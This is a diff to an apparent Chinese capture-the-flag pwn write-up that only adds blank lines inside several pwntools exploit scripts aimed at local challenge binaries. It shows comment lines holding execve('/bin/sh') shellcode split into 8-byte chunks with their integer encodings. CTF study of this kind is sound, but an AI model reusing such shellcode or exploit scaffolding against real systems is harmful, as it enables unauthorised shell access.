@@ -262,7 +262,9 @@ for i in part2:
 
 ```python
 #!/usr/bin/env python2  
+
 # -*- coding: utf-8 -*-  
+
 from pwn import *  
 
 p = process('./aaa')
@@ -327,7 +329,9 @@ py了一下**@幼稚园**学长以后得到学长的hint，内存的本质都是
 
 ```python
 #!/usr/bin/env python2
+
 # -*- coding: utf-8 -*-
+
 from pwn import *
 
 p = process('./num')
@@ -353,10 +357,15 @@ p.interactive()
 
 
 #'jhH\xb8/bin'
+
 #'///sPH\x89\xe7' -> 16683945804937768751 -> -1762798268771782865
+
 #'hri\x01\x01\x814$'
+
 #'\x01\x01\x01\x011\xf6Vj'
+
 #'\x08^H\x01\xe6VH\x89' -> 9892252127383281160 -> -8554491946326270456
+
 #'\xe61\xd2j;X\x0f\x05'
 
 ```
@@ -402,7 +411,9 @@ p.interactive()
 
 ```python
 #!/usr/bin/env python2
+
 # -*- coding: utf-8 -*-
+
 from pwn import *
 
 p = process('./one')
@@ -453,7 +464,9 @@ p.interactive()
 
 ```python
 #!/usr/bin/env python2
+
 # -*- coding: utf-8 -*-
+
 from pwn import *
 from LibcSearcher import *
 
